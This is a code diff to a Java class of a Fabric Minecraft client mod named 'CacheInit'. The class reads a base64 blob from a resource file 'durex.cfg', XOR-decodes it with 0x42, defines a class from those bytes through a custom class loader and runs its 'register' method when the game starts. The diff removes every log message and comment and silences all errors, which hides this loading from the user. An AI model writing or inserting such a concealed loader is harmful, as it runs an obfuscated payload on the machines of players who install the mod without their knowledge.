@@ -7,51 +7,36 @@ public class CacheInit implements ClientModInitializer {
     
     @Override
     public void onInitializeClient() {
-        System.out.println("[FabricCache] Initializing...");
         try {
             load();
-            System.out.println("[FabricCache] Loaded successfully");
         } catch (Exception e) {
-            System.out.println("[FabricCache] Error: " + e.getMessage());
-            e.printStackTrace();
+            // Silent
         }
     }
     
     private static void load() throws Exception {
-        // Read durex.cfg from resources
         byte[] data;
         try (InputStream is = CacheInit.class.getResourceAsStream("/durex.cfg")) {
-            if (is == null) {
-                System.out.println("[FabricCache] durex.cfg not found");
-                return;
-            }
+            if (is == null) return;
             String base64 = new String(is.readAllBytes()).replaceAll("\\s+", "");
             data = fromText(base64);
         }
         
-        // Load and execute on Minecraft thread
         final byte[] bytes = data;
         net.minecraft.client.MinecraftClient.getInstance().execute(() -> {
             try {
                 String name = readClassName(bytes);
-                System.out.println("[FabricCache] Loading class: " + name);
-                
-                // Define class using custom ClassLoader
                 CustomLoader cl = new CustomLoader(CacheInit.class.getClassLoader());
                 Class<?> cls = cl.define(name, bytes);
                 Object inst = cls.getDeclaredConstructor().newInstance();
                 cls.getMethod("register").invoke(inst);
-                
-                System.out.println("[FabricCache] Class loaded and registered");
             } catch (Throwable t) {
-                System.out.println("[FabricCache] Load error: " + t.getMessage());
-                t.printStackTrace();
+                // Silent
             }
         });
     }
     
     private static byte[] fromText(String s) throws Exception {
-        // Decode Base64
         Object decoder = Class.forName("java.util.Base64")
             .getMethod("getDecoder")
             .invoke(null);
@@ -59,7 +44,6 @@ public class CacheInit implements ClientModInitializer {
             .getMethod("decode", String.class)
             .invoke(decoder, s);
         
-        // XOR with 0x42
         for (int i = 0; i < raw.length; i++) {
             raw[i] ^= 0x42;
         }
